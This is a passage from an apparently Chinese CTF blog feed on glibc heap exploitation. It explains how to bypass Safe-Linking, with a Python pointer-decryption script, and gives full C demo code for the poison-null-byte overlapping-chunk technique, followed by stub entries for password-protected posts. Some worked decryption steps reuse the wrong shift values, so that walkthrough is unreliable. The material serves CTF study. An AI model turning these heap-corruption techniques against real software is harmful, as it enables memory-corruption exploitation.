<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 原理: A:fd;B:(pos&gt;&gt;12);C:(ptr); A=B^C; C=A^B;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/eg.png"
                      alt="eg"
                ></p>
<p><code>P</code> 表示将保存在空闲块的 <code>fd</code> 字段中的指针值。<code>L</code> 表示 <code>fd</code> 字段本身的地址。<code>L&gt;&gt;12</code>是 <code>L</code> 的右移值，用于对 <code>P</code> 进行异或运算，从而产生一个编码指针<code>P&#39;</code>。<code>Safe Linking</code> 将这个<code>P&#39;</code>值存储在 <code>fd</code> 字段中。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094308974.png"
                      alt="image-20231016094308974"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094240180.png"
                      alt="image-20231016094240180"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094355521.png"
                      alt="image-20231016094355521"
                ></p>
<p><code>bypass safe-linking</code>机制需要用到 <code>uaf</code>或者 <code>double free</code> 之类的漏洞, 同时释放 <code>tcache</code>到一个空闲 <code>tacahe bin</code>中, 此时由于<code>tcache bin</code> 中没有空闲<code>chunk</code>, <code>tcache-&gt;entry[tc_idx]=0</code>，若存在 <code>uaf</code> 或者 <code>double free</code>，可以泄露出 <code>leak_addr= (&amp;tcache_chunk-&gt;fd)&gt;&gt;12</code> 位置, 则 <code>heap_base=leak_addr&lt;&lt;12</code>。<code>double free</code> 需要将 <code>tcache_chunk_bk</code> 改为 <code>0</code>，绕过检查。对于 <code>2.32</code>及以后的 <code>glibc</code> 版本的 <code>tcache_poisoning</code> 需要将 <code>target</code> 地址进行加密。</p>
<h3 id="调试-25"><a href="#调试-25" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095050228.png"
                      alt="image-20231016095050228"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095208868.png"
                      alt="image-20231016095208868"
                ></p>
<p>申请<code>a,b</code>两个 <code>tcache_chunk</code>，最后一个 <code>chunk_0x10</code> 用于隔离，下面解析 <code>b_fd</code>。</p>
<ul>
<li>解密脚本:</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    plain=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        bits= <span class="number">64</span>-<span class="number">12</span>*(i)</span><br><span class="line">        <span class="keyword">if</span>(bits&lt;<span class="number">0</span>):</span><br><span class="line">            bits=<span class="number">0</span></span><br><span class="line">        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits</span><br><span class="line">        key = plain &gt;&gt; <span class="number">12</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;round %d:\n&quot;</span>%(i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>%key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>%plain)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>%cipher)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>原理:</li>
</ul>
<p>前置:</p>
<p><code>P:0x0000_555_555_55b_2a0; L:0x0000_555_555_55b_2d0; L&gt;&gt;12:0x0000_000_555_555_55b; p&#39;:0x0000_555_000_00e_7fb</code></p>
<p><code>(0x55555555b2d0 &gt;&gt; 12) = 0x55555555B; 0x55555555b2a0 ^ 0x55555555B = 0x55500000E7FB;</code></p>
<p>步骤:</p>
<p><code>P ^ (L &gt;&gt; 12);</code>。 此时 <code>L</code> 高 <code>12</code> 位为 <code>0</code>，而 <code>P</code> 高 <code>12</code> 位为 <code>0x555</code>，异或时将保留 <code>0x0000_555</code>，而异或操作又是可逆的，所以用保留的 <code>0x0000_555_000_000_000</code> 和 低位 <code>0x0000_000_555_000_000</code> 取异或即可得到低三位的真实地址，以此类推有了以下步骤。</p>
<p>1. </p>
<p><code>bits = 52; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 52) &lt;&lt; 52 = 0x000_000_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0;</code></p>
<p>2. </p>
<p><code>bits = 40; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 40) &lt;&lt; 40 = 0x000_055_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_000_000_0</code> </p>
<p>3. </p>
<p><code>bits = 28; </code></p>
<p><code>key = 0x000_000_055_000_000_0; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_000_000_0) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_000_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_0000;</code></p>
<p>4. </p>
<p><code>bits = 16; </code></p>
<p><code>key = 0x000_000_055_555_0000; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_0000) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_5550;</code></p>
<p>5. </p>
<p><code>bits = 4; </code></p>
<p><code>key = 0x000_000_055_555_5550; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_5550) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_b2a0  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_055_555_555_b;</code></p>
<h2 id="poison-null-byte（glibc-2-28）"><a href="#poison-null-byte（glibc-2-28）" class="headerlink" title="poison_null_byte（glibc &gt; 2.28）"></a>poison_null_byte（glibc &gt; 2.28）</h2><h4 id="源码-26"><a href="#源码-26" class="headerlink" title="源码"></a>源码</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Welcome to poison null byte!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step1: allocate padding</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="type">void</span> *heap_base = (<span class="type">void</span> *)((<span class="type">long</span>)tmp &amp; (~<span class="number">0xfff</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, heap_base);</span><br><span class="line">	<span class="type">size_t</span> size = <span class="number">0x10000</span> - ((<span class="type">long</span>)tmp&amp;<span class="number">0xffff</span>) - <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *padding= <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step2: allocate prev chunk and victim chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="type">void</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step3: link prev into largebin</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep3: Link prev into largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nCurrent Heap Layout\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    ... ...\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;padding\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span></span><br><span class="line">     	 <span class="string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free a, b, prev&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(prev);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This will add a, b and prev to largebin\nNow prev is in largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">2</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">3</span>]+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step4: allocate prev again to construct fake chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);</span><br><span class="line">	assert(prev == prev2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);</span><br><span class="line">	((<span class="type">long</span> *)prev)[<span class="number">1</span>] = <span class="number">0x501</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);</span><br><span class="line">	*(<span class="type">long</span> *)(prev + <span class="number">0x500</span>) = <span class="number">0x500</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step5: bypass unlinking</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take b out first by allocating 0x510&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span></span><br><span class="line">			<span class="string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">0</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;  <span class="comment">// b-&gt;fd &lt;- fake_chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span></span><br><span class="line">			<span class="string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">free</span>(a2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="type">void</span> **)a)[<span class="number">1</span>], victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">9</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">// pass unlink_chunk in malloc.c:</span></span><br><span class="line">	<span class="comment">//      mchunkptr fd = p-&gt;fd;</span></span><br><span class="line">	<span class="comment">//      mchunkptr bk = p-&gt;bk;</span></span><br><span class="line">	<span class="comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span></span><br><span class="line">	<span class="comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And we have:\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span></span><br><span class="line">		 );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step6: add fake chunk into unsorted bin by off-by-null</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take victim out from unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *victim2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, victim2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;off-by-null into the size of vicim&quot;</span>);</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	((<span class="type">char</span> *)victim2)[<span class="number">-8</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span></span><br><span class="line">			<span class="string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span></span><br><span class="line">			<span class="string">&quot;add the merged chunk into unsortedbin.&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span></span><br><span class="line">			<span class="string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>], prev, ((<span class="type">void</span> **)b2)[<span class="number">0</span>], prev);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span></span><br><span class="line">			<span class="string">&quot;And it is overlapped with the prev chunk&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step7: validate the chunk overlapping</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *merged = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);</span><br><span class="line">	<span class="built_in">memset</span>(merged, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite prev&#x27;s content&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prev2, <span class="string">&#x27;C&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(merged, <span class="string">&quot;CCCCCCCCC&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>2.29</code>后的<code>libc</code>在两个<code>free chunk</code> 进行合并前多一次对<code>prevsize</code>的值检查对应的源代码如下:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="调试-26"><a href="#调试-26" class="headerlink" title="调试"></a>调试</h4>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统第一部分虚拟化</title>
    <url>/2024/01/31/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E8%99%9A%E6%8B%9F%E5%8C%96/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="13d46043535f7c9ec9e9bb7669579c9bbf0d860d8a25886540ef46dd85120ff3">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f635485e3acb6df2a60fb9ef18b95c363d74926a9605b0c38659c6c7ca4328c90239fc5a761fbd10ef808e852014149bce198d7746e5065355feea5f97e4e82e156774c48afd8dec9c996a0dab1e440a3a7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核分析之进程</title>
    <url>/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="dee6b40d4cb21bf0ef2df8fa7d7b4495cdfa64138ee38809218b8b49773c7cea"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel进程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核分析之内存管理</title>
    <url>/2024/01/25/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
